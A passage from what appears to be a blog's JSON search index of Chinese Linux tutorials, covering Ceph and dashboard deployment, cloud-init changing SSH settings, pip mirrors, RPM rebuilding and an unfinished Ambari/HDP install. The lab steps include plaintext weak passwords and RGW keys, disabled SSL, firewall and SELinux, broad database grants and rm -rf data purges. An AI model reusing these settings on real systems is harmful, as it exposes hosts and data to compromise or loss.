lvm [SWAP] sdb 8:16 0 20G 0 disk └─ceph--2bb0ec8d--547c--42c2--9858--08ccfd043bd4-osd--block--33e8dba4--6dfc--4753--b9ba--0d0c54166f0c 253:2 0 20G 0 lvm sr0 查看osd\n[root@ceph-admin my-ceph]# ceph-deploy disk list ceph-node1 ceph-node2 ...... ...... [ceph-node1][INFO ] Disk /dev/mapper/ceph--2bb0ec8d--547c--42c2--9858--08ccfd043bd4-osd--block--33e8dba4--6dfc--4753--b9ba--0d0c54166f0c: 21.5 GB, 21470642176 bytes, 41934848 sectors ...... ...... [ceph-node2][INFO ] Disk /dev/mapper/ceph--f9a95e6c--fc7b--46b4--a835--dd997c0d6335-osd--block--db903124--4c01--40d7--8a58--b26e17c1db29: 21.5 GB, 21470642176 bytes, 41934848 sectors 同步集群文件，这样就可以在所有节点执行ceph命令了\n[root@ceph-admin my-ceph]# ceph-deploy admin ceph-admin ceph-node1 ceph-node2 在其他节点查看osd的目录树\n[root@ceph-node1 ~]# ceph osd tree ID CLASS WEIGHT TYPE NAME STATUS REWEIGHT PRI-AFF -1 0.03897 root default -3 0.01949 host ceph-node1 0 hdd 0.01949 osd.0 up 1.00000 1.00000 -5 0.01949 host ceph-node2 1 hdd 0.01949 osd.1 up 1.00000 1.00000 配置mgr\n[root@ceph-admin my-ceph]# ceph-deploy mgr create ceph-admin 查看集群状态和集群service状态\n此时是HEALTH_WARN状态，是由于启用了不安全模式\n[root@ceph-admin my-ceph]# ceph health HEALTH_WARN mon is allowing insecure global_id reclaim [root@ceph-admin my-ceph]# ceph -s cluster: id: fd816347-598c-4ed6-b356-591a618a0bdc health: HEALTH_WARN mon is allowing insecure global_id reclaim services: mon: 1 daemons, quorum ceph-admin (age 3h) mgr: mon_mgr(active, since 17s) osd: 2 osds: 2 up (since 3m), 2 in (since 3m) data: pools: 0 pools, 0 pgs objects: 0 objects, 0 B usage: 2.0 GiB used, 38 GiB / 40 GiB avail pgs: 禁用不安全模式\n[root@ceph-admin my-ceph]# ceph config set mon auth_allow_insecure_global_id_reclaim false [root@ceph-admin my-ceph]# ceph health HEALTH_OK 开启dashboard [root@ceph-admin my-ceph]# yum install -y ceph-mgr-dashboard [root@ceph-admin my-ceph]# ceph mgr module enable dashboard # 创建自签证书 [root@ceph-admin my-ceph]# ceph dashboard create-self-signed-cert # 创建密码文件 [root@ceph-admin my-ceph]# echo abc123 \u0026gt; ./dashboard_user_pw # 创建dashboard的登录用户 [root@ceph-admin my-ceph]# ceph dashboard ac-user-create admin -i ./dashboard_user_pw administrator {\u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;lastUpdate\u0026#34;: 1646037503, \u0026#34;name\u0026#34;: null, \u0026#34;roles\u0026#34;: [\u0026#34;administrator\u0026#34;], \u0026#34;password\u0026#34;: \u0026#34;$2b$12$jGsvau8jFMb4pDwLU/t8KO1sKvmBMcNUYycbXusmgkvTQzlzrMyKi\u0026#34;, \u0026#34;email\u0026#34;: null} [root@ceph-admin my-ceph]# ceph mgr services { \u0026#34;dashboard\u0026#34;: \u0026#34;https://ceph-admin:8443/\u0026#34; } 测试访问\n上图中测试环境是win10+chrome，同事反应mac+chrome会出现无法访问的情况，原因是我们使用的自签证书，浏览器并不信任此证书，可以通过以下两种方式解决\n关闭dashboard的ssl访问\n下载证书配置浏览器信任证书\n关闭dashboard的ssl访问 [root@ceph-admin my-ceph]# ceph config set mgr mgr/dashboard/ssl false [root@ceph-admin my-ceph]# ceph mgr module disable dashboard [root@ceph-admin my-ceph]# ceph mgr module enable dashboard [root@ceph-admin my-ceph]# ceph mgr services { \u0026#34;dashboard\u0026#34;: \u0026#34;http://ceph-admin:8080/\u0026#34; } 如果出现Module 'dashboard' has failed: IOError(\u0026quot;Port 8443 not free on '::'\u0026quot;,)这种报错，需要重启下mgr：systemctl restart ceph-mgr@ceph-admin\n测试访问\n开启rgw管理功能 默认object gateway功能没有开启\n创建rgw实例\nceph-deploy rgw create ceph-admin 默认运行端口是7480\n创建rgw用户\n[root@ceph-admin my-ceph]# radosgw-admin user create --uid=rgw --display-name=rgw --system 提供dashboard证书\n[root@ceph-admin my-ceph]# echo UI2T50HNZUCVVYYZNDHP \u0026gt; rgw_user_access_key [root@ceph-admin my-ceph]# echo 11rg0WbXuh2Svexck3vJKs19u1UQINixDWIpN5Dq \u0026gt; rgw_user_secret_key [root@ceph-admin my-ceph]# ceph dashboard set-rgw-api-access-key -i rgw_user_access_key Option RGW_API_ACCESS_KEY updated [root@ceph-admin my-ceph]# ceph dashboard set-rgw-api-secret-key -i rgw_user_secret_key Option RGW_API_SECRET_KEY updated 禁用ssl\n[root@ceph-admin my-ceph]# ceph dashboard set-rgw-api-ssl-verify False Option RGW_API_SSL_VERIFY updated 启用rgw\n[root@ceph-admin my-ceph]# ceph dashboard set-rgw-api-host 192.168.150.101 Option RGW_API_HOST updated [root@ceph-admin my-ceph]# ceph dashboard set-rgw-api-port 7480 Option RGW_API_PORT updated [root@ceph-admin my-ceph]# ceph dashboard set-rgw-api-scheme http Option RGW_API_SCHEME updated [root@ceph-admin my-ceph]# ceph dashboard set-rgw-api-user-id rgw Option RGW_API_USER_ID updated [root@ceph-admin my-ceph]# systemctl restart ceph-radosgw.target 验证\n目前object gateway功能已成功开启\n其他 清除ceph集群 清除安装包\n[root@ceph-admin ~]# ceph-deploy purge ceph-admin ceph-node1 ceph-node2 清除配置信息\n[root@ceph-admin ~]# ceph-deploy purgedata ceph-admin ceph-node1 ceph-node2 [root@ceph-admin ~]# ceph-deploy forgetkeys 每个节点删除残留的配置文件\nrm -rf /var/lib/ceph/osd/* rm -rf /var/lib/ceph/mon/* rm -rf /var/lib/ceph/mds/* rm -rf /var/lib/ceph/bootstrap-mds/* rm -rf /var/lib/ceph/bootstrap-osd/* rm -rf /var/lib/ceph/bootstrap-mon/* rm -rf /var/lib/ceph/tmp/* rm -rf /etc/ceph/* rm -rf /var/run/ceph/* 清理磁盘设备(/dev/mapper/ceph*)\nls /dev/mapper/ceph-* | xargs -I% -- dmsetup remove % dashboard无法访问的问题 在关闭dashboard的https后，出现了一个很奇怪的问题，使用chrome浏览器无法访问dashboard了，edge或者使用chrome无痕模式可以正常访问，期间尝试了各种方法包括重新配置dashboard和清理chrome浏览器的缓存和cookie等方式都没有解决问题，结果第二天起来打开环境一看自己好了（淦）\n问题情况见下图\n日志报错：\n同步ceph配置文件 ceph-deploy --overwrite-conf config push ceph-node{1,2,3,4} 添加mon节点和mgr节点 ceph-deploy mon create ceph-node{1,2,3,4} ceph-deploy mgr create ceph-node{1,2,3,4} 记得修改配置文件\n之后同步配置文件\nceph-deploy --overwrite-conf config push ceph-node{1,2,3,4} 参考 https://www.cnblogs.com/kevingrace/p/9141432.html\nhttps://www.cnblogs.com/weijie0717/p/8378485.html\nhttps://www.cnblogs.com/weijie0717/p/8383938.html\nhttps://blog.csdn.net/qq_40017427/article/details/106235456\n","permalink":"https://www.lvbibir.cn/posts/tech/centos7_deploy_ceph_dashboard_nautilus/","summary":"前言 ceph测试环境的搭建 基本环境 物理环境：Vmware Workstaion 系统版本：Centos-7.9-Minimal 两个osd节点添加一块虚拟磁盘，建议","title":"centos7部署ceph+dashboard（nautilus）"},{"content":"前言 在openEuler20.03 (LTS-SP1)系统上进行一些测试，发现某个东西会自动修改ssh配置文件导致系统无法通过密码登录，最后排查是由于安装了cloud-init导致的。\n以下是大致的排查思路\n出现这个问题前做的操作是安装了一些项目组同事指定的包，问题就应该出在这些包上\nyum install -y telnet rsync ntpdate zip unzip libaio dos2unix sos vim vim-enhanced net-tools man ftp lrzsz psmisc gzip network-scripts cloud-init cloud-utils-growpart tar libnsl authselect-compat 大致看了下，除了cloud-Init和cloud-utils-growpart这两个包其他包基本不可能去修改ssh的配置\n直接检索这两个包的所有文件中的配置，是否与PasswordAuthentication有关\n[root@localhost ~]# grep -nr PasswordAuthentication `rpm -ql cloud-utils-growpart` [root@localhost ~]# grep -nr PasswordAuthentication `rpm -ql cloud-init` 找到了修改这个参数代码的具体实现\n查看该文件\n[root@localhost ~]# vim +98 /usr/lib/python3.7/site-packages/cloudinit/config/cc_set_passwords.py 具体的判断操作和修改操作\n修改操作就不去深究了，主要看下判断操作，可以看到判断操作是使用了 util.is_true() ，该util模块也在该文件中引用了\n再去找这个util模块的具体实现\npython引用的模块路径如下，否则会抛出错误\n文件的同级路径下 sys.path 路径下 并没有在同级目录下\n[root@localhost ~]# ll /usr/lib/python3.7/site-packages/cloudinit/config/ | grep cloudinit sys.path 路径不知道可以用python终端输出下\n在/usr/lib/python3.7/site-packages路径下找到了cloudinit模块的util子模块\n查看util.is_true和util.is_false具体的函数实现\n逻辑很简单，判断 val 参数是否为bool值，否则对val参数的值进行处理后再查看是否在check_set中\n再回头看之前的/usr/lib/python3.7/site-packages/cloudinit/config/cc_set_passwords.py文件是怎样对util.is_true和util.is_false传参的\n可以看到是由handle_ssh_pwauth()函数传进来的\n再继续找哪个文件调用了这个函数\n还是这个文件，第230行\n这里参数pw_auth传的值是cfg.get(\u0026lsquo;ssh_pwauth\u0026rsquo;)\ncfg.get()这个函数get的东西是/etc/cloud/cloud.cfg配置文件下的ssh_pwauth的值\n到这里，就可以回头再看整个逻辑了\n调用handle_ssh_pwauth()函数，传了一个参数 pw_auth=0 调用util.is_true()和util.is_false函数，传了同一个参数 val=0 上述两个函数执行完后cfg_val的值最终为no 调用update_ssh_config({cfg_name: cfg_val})函数，cfg_name=PasswordAuthentication，cfg_val=no 即将sshd的配置文件的PasswordAuthentication值改为no ","permalink":"https://www.lvbibir.cn/posts/tech/cloud-init_change_ssh_config/","summary":"前言 在openEuler20.03 (LTS-SP1)系统上进行一些测试，发现某个东西会自动修改ssh配置文件导致系统无法通过密码登录，最后排","title":"cloud-init自动将ssh配置文件的PasswordAuthentication参数值修改为no"},{"content":"中国科学技术大学 : https://pypi.mirrors.ustc.edu.cn/simple\n清华：https://pypi.tuna.tsinghua.edu.cn/simple\n豆瓣：http://pypi.douban.com/simple/\n华中理工大学 : http://pypi.hustunique.com/simple\n山东理工大学 : http://pypi.sdutlinux.org/simple\n阿里云：https://mirrors.aliyun.com/pypi/simple/\nlinux环境 mkdir ~/.pip cat \u0026gt; ~/.pip/pip.conf \u0026lt;\u0026lt; EOF [global] trusted-host=mirrors.aliyun.com index-url=https://mirrors.aliyun.com/pypi/simple/ EOF windows环境 使用dos命令set找到 userprofile 路径，在该路径下创建pip文件夹，在pip文件夹下创建pip.ini\npip.ini具体配置\n[global] timeout = 6000 index-url = https://pypi.tuna.tsinghua.edu.cn/simple trusted-host = pypi.tuna.tsinghua.edu.cn ","permalink":"https://www.lvbibir.cn/posts/tech/python3_change_pip_repo/","summary":"中国科学技术大学 : https://pypi.mirrors.ustc.edu.cn/simple 清华：https://pypi.tuna.tsinghua.edu.cn/simple 豆瓣：http://pypi.do","title":"python3修改pip源"},{"content":"前言 要修改rpm包中的文件，对于自己编译的rpm包，只需要在源码中修改好然后重新编译即可。而对于并不是自己编译的rpm包，且不熟悉编译环境的情况下，可以使用rpm-build和rpm-rebuild工具反编译来修改rpm中的文件\n这里使用ceph-mgr软件包进行演示\n安装rpm-build\u0026amp;rpmrebuild rpmrebuild官网：http://rpmrebuild.sourceforge.net\nrpmrebuild下载地址：https://sourceforge.net/projects/rpmrebuild/files/rpmrebuild/2.15/rpmrebuild-2.15.tar.gz/download\n解压rpmrebuild\n[root@localhost ~]# mkdir -p /data/rpmbuild [root@localhost ~]# tar zxf rpmrebuild-2.15.tar.gz -C /data/rpmbuild/ [root@localhost ~]# ll /opt/rpmrebuild/ rpm-build直接使用yum安装即可\n[root@localhost ~]# yum install -y rpm-build 反编译\u0026amp;修改\u0026amp;重新编译 安装准备重新打包的rpm\n[root@localhost ~]# rpm -ivh ceph-mgr-12.2.13-0.el7.x86_64.rpm 查看rpm的安装名称\n[root@localhost ~]# rpm -qa |grep mgr ceph-mgr-12.2.13-0.el7.x86_64 配置rpm编译目录\nvim ~/.rpmmacros %_topdir /data/rpmbuild 创建目录\nmkdir /data/rpmbuild/BUILDROOT mkdir /data/rpmbuild/SPECS 执行脚本\n[root@localhost ~]# cd /data/rpmbuild/ [root@localhost rpmbuild]# ./rpmrebuild.sh -s SPECS/abc.spec ceph-mgr [root@localhost rpmbuild]# cd 解压原版RPM包\n[root@localhost ~]# rpm2cpio ceph-mgr-12.2.13-0.el7.x86_64.rpm |cpio -idv 这里软件包解压后是两个目录\n根据需求替换修改解压后的文件，这里我替换两个文件/root/usr/lib64/ceph/mgr/dashboard/static/Ceph_Logo_Standard_RGB_White_120411_fa.png和/root/usr/lib64/ceph/mgr/dashboard/static/logo-mini.png，并给原先的文件做一个备份\n[root@localhost static]# mv logo-mini.png logo-mini.png.bak [root@localhost static]# mv Ceph_Logo_Standard_RGB_White_120411_fa.png Ceph_Logo_Standard_RGB_White_120411_fa.png.bak [root@localhost static]# cp kubernetes-logo.svg logo-mini.png [root@localhost static]# cp kubernetes-logo.svg Ceph_Logo_Standard_RGB_White_120411_fa.png 修改abc.spec文件\n找到原文件所在的行，添加备份文件\n[root@localhost ~]# vim /data/rpmbuild/SPECS/abc.spec 这里创建的bbb目录是临时使用，编译过程肯定会报错，因为路径不对，根据报错修改路径\n[root@localhost ~]# mkdir -p /data/rpmbuild/BUILDROOT/bbb/ [root@localhost ~]# mv ./usr/ /data/rpmbuild/BUILDROOT/bbb/ [root@localhost ~]# mv ./var/ /data/rpmbuild/BUILDROOT/bbb/ [root@localhost ~]# rpmbuild -ba /data/rpmbuild/SPECS/abc.spec 这里可以看到他请求的路径\n修改目录名\n[root@localhost ~]# mv /data/rpmbuild/BUILDROOT/bbb/ /data/rpmbuild/BUILDROOT/ceph-mgr-12.2.13-0.el7.x86_64 再次编译\n[root@localhost ~]# rpmbuild -ba /data/rpmbuild/SPECS/abc.spec 生成的rpm位置在/data/rpmbuild/RPMS/\n查看原rpm包的文件\n[root@localhost ~]# cd /usr/lib64/ceph/mgr/dashboard/static [root@localhost static]# ll total 16 drwxr-xr-x 5 root root 117 Dec 6 03:11 AdminLTE-2.3.7 -rw-r--r-- 1 root root 4801 Jan 30 2020 Ceph_Logo_Standard_RGB_White_120411_fa.png -rw-r--r-- 1 root root 1150 Jan 30 2020 favicon.ico drwxr-xr-x 7 root root 94 Dec 6 03:11 libs -rw-r--r-- 1 root root 1811 Jan 30 2020 logo-mini.png 安装新rpm包，查看文件\n[root@localhost ~]# cd /data/rpmbuild/RPMS/x86_64 [root@localhost x86_64]# rpm -e --nodeps ceph-mgr [root@localhost x86_64]# rpm -ivh ceph-mgr-12.2.13-0.el7.x86_64.rpm [root@localhost x86_64]# cd /usr/lib64/ceph/mgr/dashboard/static [root@localhost static]# ll total 24 drwxr-xr-x 5 root root 117 Dec 6 03:53 AdminLTE-2.3.7 -rw-r--r-- 1 root root 1877 Dec 6 03:44 Ceph_Logo_Standard_RGB_White_120411_fa.png -rw-r--r-- 1 root root 4801 Dec 6 03:41 Ceph_Logo_Standard_RGB_White_120411_fa.png.bak -rw-r--r-- 1 root root 1150 Dec 6 03:41 favicon.ico drwxr-xr-x 7 root root 94 Dec 6 03:53 libs -rw-r--r-- 1 root root 1877 Dec 6 03:44 logo-mini.png -rw-r--r-- 1 root root 1811 Dec 6 03:41 logo-mini.png.bak 至此，rpm包中的文件修改以及重新打包的所有步骤都已完成\n参考 https://www.cnblogs.com/felixzh/p/10564895.html\n","permalink":"https://www.lvbibir.cn/posts/tech/change_file_in_rpm_pkg/","summary":"前言 要修改rpm包中的文件，对于自己编译的rpm包，只需要在源码中修改好然后重新编译即可。而对于并不是自己编译的rpm包，且不熟悉编译环境的","title":"通过rpm反编译修改rpm包内的文件"},{"content":"前期准备 1. 安装包准备 Ambari2.7.5. HDP3.1.5. libtirpc-devel: 链接：https://pan.baidu.com/s/1eteZ2jGkSq4Pz5YFfHyJgQ 提取码：6hq3\n2.服务器配置 主机名 cpu 内存 硬盘 系统版本 ip地址 node001 4c 10g 50g isoft-serveros-4.2 192.168.150.106 node002 2c 4g 20g isoft-serveros-4.2 192.168.150.107 3.修改系统版本文件（所有节点执行） sed -i \u0026#39;s/4/7/g\u0026#39; /etc/redhat-release sed -i \u0026#39;s/4/7/g\u0026#39; /etc/os-release 4.配置主机名（所有节点执行） 2台服务器的hosts都需要做如下修改\n修改主机名 hostnamectl set-hostname node001 bash 修改hosts文件 vim /etc/hosts 127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6 192.168.150.106 node001 192.168.150.107 node002 5.关闭防火墙及selinux（所有节点执行） 2台服务器上分别执行以下操作，关闭防火墙并配置开机不自动启动\nsystemctl stop firewalld systemctl disable firewalld setenforce 0 为了重启后依然关闭，配置如下文件\nvim /etc/sysconfig/selinux 修改 SELINUX=disabled 6.配置ssh互信（所有节点执行） 方法一\n在每台服务器上执行如下操作，一直回车即可\nssh-keygen -t rsa ssh-copy-id -i /root/.ssh/id_rsa.pub node001 ssh-copy-id -i /root/.ssh/id_rsa.pub node002 方法二\n在每台服务器上执行如下操作，一直回车即可\nssh-keygen -t rsa 在服务器1上将公钥（名为id_rsa.pub文件）追加到认证文件（名为authorized_keys文件）中:\ncat ~/.ssh/id_rsa.pub \u0026gt;\u0026gt; ~/.ssh/authorized_keys 去其他服务器节点将~/.ssh/id_rsa.pub中的内容拷贝到服务器1的~/.ssh/authorized_keys中,查看文件中的内容\ncat ~/.ssh/authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/eA09X4s5RIYvuYNxVvtOo6unY1mgipsFyoz/hy/Gwk0onfZvBi/Sl3TVRZO5aqcHccAGlLF7OPTKH1qUuKVtnUOQik0TouL5VKsOBDMHHRT9D5UwqaIE8tYDC8V6uwieFgscZcBjhrsJ/Iramo9ce7N9RTO3otRMRQxOs+Wd1F/ZOmpRtMGU2N4RH4i2quRU6m2lt/eJKpNupSHKoztTQRsEanilHVASnikAXH8JpG70iO7RXR/hLz+/Of3ISUrOMSO4/ZIIu4xnYN3jvsXOdK/qIhP/PI2s+uF22IvVE6xZYVadQFa4zAuhQmCBWkE7vMyI1UJkxP7OQYj72LUH root@node001 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCnz8wHoytR2Xlnl04rQq4I2vgUVWbkKjv30pj+Toz4719ah4cY9pvZj0JsfhVzaaCsR14BLFVLkqKUhCWK3K6muT4iHb+N0WirpbwfJkztmQeco7Ha9xrPQ8v/I4xZujFoMVA0tkb/32zRTxOkPv9AUgB8V6Lin6LnB/AcnhnmoIs5PdbAdh/kBGpQGKIZkbyCUOYz9/PZuGJoJBblqfWiqzxYYLN9+cYMkmPnB1HdDewAepIsIC18U3ujE+1Su2UlmISPvvr1zG4XR4ZZoKQsOOJq3XRMGVkDvmFhl03JHZpd6BW0796CeYVZ41UomWXTOduQql+tYWUbegzGLmRZ root@node002 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8AFoGJHp2M45xLYNzXUHLWzRwHsgRPHjeErStq0tEy9bQv4OkN41j0FrxVAYJiGHdHGturriVgUEtL59RjcrJH6bAvhP54nM5YiQlNnWnSUR27Zuaodz4nhYUFq/Co5eDN6lTfL8pgYiEdpBOvE5t1w3bisdblP7YGQ2lF1zzCEGfQ79QbntEbyGNoR9sGHm11x9fOH+fape8TjQJrEAO4d1tAhMqVygQKwqwAPKeqhEum6BaLli83TsXzd7gyz9H7AAc1m04NaLB26xfynW6MVuk1j94awXKlGXjrbNTC/Kg6M8bd5PT/k3DOkx4b+nEs8xZ5x1j4D2OaO1X6rZx root@node003 设置认证文件的权限：\nchmod 600 ~/.ssh/authorized_keys 将~/.ssh/authorized_keys同步到其他节点\nscp ~/.ssh/authorized_keys node002:~/.ssh/authorized_keys 注意：这里第一次使用同步还需要密码，之后就不需要了 验证免密是否配置成功\nssh到不同服务器\nssh node002 7. 配置ntp时钟同步 选择一台服务器作为NTP Server，这里选择node001\n将如下配置vim /etc/ntp.conf\n# Use public servers from the pool.ntp.org project. # Please consider joining the pool (http://www.pool.ntp.org/join.html). server 0.centos.pool.ntp.org iburst server 1.centos.pool.ntp.org iburst server 2.centos.pool.ntp.org iburst server 3.centos.pool.ntp.org iburst 修改为\n# Use public servers from the pool.ntp.org project. # Please consider joining the pool (http://www.pool.ntp.org/join.html). #server 0.centos.pool.ntp.org iburst #server 1.centos.pool.ntp.org iburst #server 2.centos.pool.ntp.org iburst #server 3.centos.pool.ntp.org iburst server 127.127.1.0 fudge 127.127.1.0 stratum 10 node002节点做如下配置\nvim /etc/ntp.conf 将\n# Use public servers from the pool.ntp.org project. # Please consider joining the pool (http://www.pool.ntp.org/join.html). server 0.centos.pool.ntp.org iburst server 1.centos.pool.ntp.org iburst server 2.centos.pool.ntp.org iburst server 3.centos.pool.ntp.org iburst 修改为\n# Use public servers from the pool.ntp.org project. # Please consider joining the pool (http://www.pool.ntp.org/join.html). #server 0.centos.pool.ntp.org iburst #server 1.centos.pool.ntp.org iburst #server 2.centos.pool.ntp.org iburst #server 3.centos.pool.ntp.org iburst server 192.168.150.106 在每台服务器上启动ntpd服务，并配置服务开机自启动\nsystemctl restart ntpd systemctl enable ntpd 9.设置swap（所有节点执行） echo vm.swappiness = 1 \u0026gt;\u0026gt; /etc/sysctl.conf sysctl vm.swappiness=1 sysctl -p 10. 关闭透明大页面（所有节点执行） 由于透明超大页面已知会导致意外的节点重新启动并导致RAC出现性能问题，因此Oracle强烈建议禁用\necho never \u0026gt; /sys/kernel/mm/transparent_hugepage/defrag echo never \u0026gt; /sys/kernel/mm/transparent_hugepage/enabled 11.安装http服务（node001节点执行） 安装apache的httpd服务主要用于搭建OS. Ambari和hdp的yum源。在集群服务器中选择一台服务器来安装httpd服务，命令如下：\nyum -y install httpd systemctl start httpd systemctl enable httpd.service 验证，在浏览器输入http://192.168.150.106看到如下截图则说明启动成功。\n13.安装Java（所有节点执行） 下载地址：https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html\ntar -zxvf jdk-8u271-linux-x64.tar.gz mkdir /usr/local/java mv jdk1.8.0_271/* /usr/local/java 配置环境变量\nvim /root/.bashrc 添加如下配置\nexport JAVA_HOME=/usr/local/java export PATH=$PATH:$JAVA_HOME/bin export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar export JRE_HOME=$JAVA_HOME/jre 激活配置\nsource /root/.bashrc java -version 14. 安装maven3.6（node001节点执行） 下载解压\ntar -zxvf apache-maven-3.6.3-bin.tar.gz mkdir -p /opt/src/maven mv apache-maven-3.6.3/* /opt/src/maven 配置maven环境变量\nvim /root/.bashrc # set maven home export PATH=$PATH:/opt/src/maven/bin 激活\nsource /root/.bashrc 安装Ambari\u0026amp;HDP 1. 配置Ambari. HDP. libtirpc-devel本地源 解压\ntar -zxvf ambari-2.7.5.0-centos7.tar.gz -C /var/www/html/ tar -zxvf HDP-3.1.5.0-centos7-rpm.tar.gz -C /var/www/html/ tar -zxvf HDP-GPL-3.1.5.0-centos7-gpl.tar.gz -C /var/www/html/ tar -zxvf HDP-UTILS-1.1.0.22-centos7.tar.gz -C /var/www/html/ ll /var/www/html/ 总用量 0 drwxr-xr-x. 3 root root 21 11月 23 22:31 ambari drwxr-xr-x. 3 1001 users 21 12月 18 2019 HDP drwxr-xr-x. 3 1001 users 21 12月 18 2019 HDP-GPL drwxr-xr-x. 3 1001 users 21 8月 13 2018 HDP-UTILS 设置设置用户组和授权\nchown -R root:root /var/www/html/HDP chown -R root:root /var/www/html/HDP-GPL chown -R root:root /var/www/html/HDP-UTILS chmod -R 755 /var/www/html/HDP chmod -R 755 /var/www/html/HDP-GPL chmod -R 755 /var/www/html/HDP-UTILS 创建libtirpc-devel本地源\nmkdir /var/www/html/libtirpc mv /root/libtirpc-* /var/www/html/libtirpc/ cd /var/www/html/libtirpc createrepo . 制作本地源\n配置ambari.repo\nvim /etc/yum.repos.d/ambari.repo [Ambari-2.7.5.0] name=Ambari-2.7.5.0 baseurl=http://192.168.150.106/ambari/centos7/2.7.5.0-72/ gpgcheck=0 enabled=1 priority=1 配置HDP和HDP-TILS\nvim /etc/yum.repos.d/HDP.repo [HDP-3.1.5.0] name=HDP Version - HDP-3.1.5.0 baseurl=http://192.168.150.106/HDP/centos7/3.1.5.0-152/ gpgcheck=0 enabled=1 priority=1 [HDP-UTILS-1.1.0.22] name=HDP-UTILS Version - HDP-UTILS-1.1.0.22 baseurl=http://192.168.150.106/HDP-UTILS/centos7/1.1.0.22/ gpgcheck=0 enabled=1 priority=1 [HDP-GPL-3.1.5.0] name=HDP-GPL Version - HDP-GPL-3.1.5.0 baseurl=http://192.168.150.106/HDP-GPL/centos7/3.1.5.0-152 gpgcheck=0 enabled=1 priority=1 配置libtirpc.repo\nvim /etc/yum.repos.d/libtirpc.repo [libtirpc_repo] name=libtirpc-0.2.4-0.16 baseurl=http://192.168.150.106/libtirpc/ gpgcheck=0 enabled=1 priority=1 拷贝到其他节点\nscp /etc/yum.repos.d/* node002:/etc/yum.repos.d/ 查看源\nyum clean all yum repolist 2. 安装mariadb（node001节点执行） 安装MariaDB服务器\nyum install mariadb-server -y 启动并设置开机启动\nsystemctl enable mariadb systemctl start mariadb 初始化\n/usr/bin/mysql_secure_installation [...] Enter current password for root (enter for none): OK, successfully used password, moving on... [...] Set root password? [Y/n] Y New password:123456 Re-enter new password:123456 [...] Remove anonymous users? [Y/n] Y [...] Disallow root login remotely? [Y/n] N [...] Remove test database and access to it [Y/n] Y [...] Reload privilege tables now? [Y/n] Y [...] All done! If you\u0026#39;ve completed all of the above steps, your MariaDB 18 installation should now be secure. Thanks for using MariaDB! 为MariaDB安装MySQL JDBC驱动程序\ntar zxf mysql-connector-java-5.1.40.tar.gz mv mysql-connector-java-5.1.40/mysql-connector-java-5.1.40-bin.jar /usr/share/java/mysql-connector-java.jar 创建需要的数据库\n如果需要ranger，编辑以下⽂件： vim /etc/my.cnf 并添加以下⾏：\nlog_bin_trust_function_creators = 1 重启数据库并登录\nsystemctl restart mariadb mysql -u root -p123456 3. 安装和配置ambari-server（node001节点执行） 安装ambari-server\nyum -y install ambari-server 复制mysql jdbc驱动到/var/lib/ambari-server/resources/\ncp /usr/share/java/mysql-connector-java.jar /var/lib/ambari-server/resources/ 配置/etc/ambari-server/conf/ambari.properties，添加如下行\nvim /etc/ambari-server/conf/ambari.properties server.jdbc.driver.path=/usr/share/java/mysql-connector-java.jar 执行\nambari-server setup --jdbc-db=mysql --jdbc-driver=/usr/share/java/mysql-connector-java.jar 初始化ambari-server\nambari-server setup 1） 提示是否自定义设置。输入：y Customize user account for ambari-server daemon [y/n] (n)? y （2）ambari-server 账号。 Enter user account for ambari-server daemon (root): 如果直接回车就是默认选择root用户 如果输入已经创建的用户就会显示： Enter user account for ambari-server daemon (root):ambari Adjusting ambari-server permissions and ownership... （3）设置JDK。输入：2 Checking JDK... Do you want to change Oracle JDK [y/n] (n)? y [1] Oracle JDK 1.8 + Java Cryptography Extension (JCE) Policy Files 8 [2] Custom JDK ============================================================================== Enter choice (1): 2 如果上面选择3自定义JDK,则需要设置JAVA_HOME。输入：/usr/local/java WARNING: JDK must be installed on all hosts and JAVA_HOME must be valid on all hosts. WARNING: JCE Policy files are required for configuring Kerberos security. If you plan to use Kerberos,please make sure JCE Unlimited Strength Jurisdiction Policy Files are valid on all hosts. Path to JAVA_HOME: /usr/local/java Validating JDK on Ambari Server...done. Completing setup... （4）安装GPL，选择：y Checking GPL software agreement... GPL License for LZO: https://www.gnu.org/licenses/old-licenses/gpl-2.0.en.html Enable Ambari Server to download and install GPL Licensed LZO packages [y/n] (n)? y （5）数据库配置。选择：y Configuring database... Enter advanced database configuration [y/n] (n)? y （6）选择数据库类型。输入：3 Configuring database... ============================================================================== Choose one of the following options: [1] - PostgreSQL (Embedded) [2] - Oracle [3] - MySQL/ MariaDB [4] - PostgreSQL [5] - Microsoft SQL Server (Tech Preview) [6] - SQL Anywhere ============================================================================== Enter choice (3): 3 （7）设置数据库的具体配置信息，根据实际情况输入，如果和括号内相同，则可以直接回车。如果想重命名，就输入。 Hostname (localhost):node001 Port (3306): 3306 Database name (ambari): ambari Username (ambari): ambari Enter Database Password (bigdata):ambari123 Re-Enter password: ambari123 （8）将Ambari数据库脚本导入到数据库 WARNING: Before starting Ambari Server, you must run the following DDL against the database to create the schema: /var/lib/ambari-server/resources/Ambari-DDL-MySQL-CREATE.sql 这个sql后面会用到，导入数据库 Proceed with configuring remote database connection properties [y/n] (y)? y 登录mariadb创建ambari安装所需要的库\n设置的账号后面配置ambari-server的时候会用到\nmysql -uroot -p123456 CREATE DATABASE ambari; use ambari; CREATE USER \u0026#39;ambari\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;ambari123\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;ambari\u0026#39;@\u0026#39;%\u0026#39;; CREATE USER \u0026#39;ambari\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;ambari123\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;ambari\u0026#39;@\u0026#39;localhost\u0026#39;; CREATE USER \u0026#39;ambari\u0026#39;@\u0026#39;node001\u0026#39; IDENTIFIED BY \u0026#39;ambari123\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;ambari\u0026#39;@\u0026#39;node001\u0026#39;; source /var/lib/ambari-server/resources/Ambari-DDL-MySQL-CREATE.sql show tables; use mysql; select host,user from user where user=\u0026#39;ambari\u0026#39;; CREATE DATABASE hive; use hive; CREATE USER 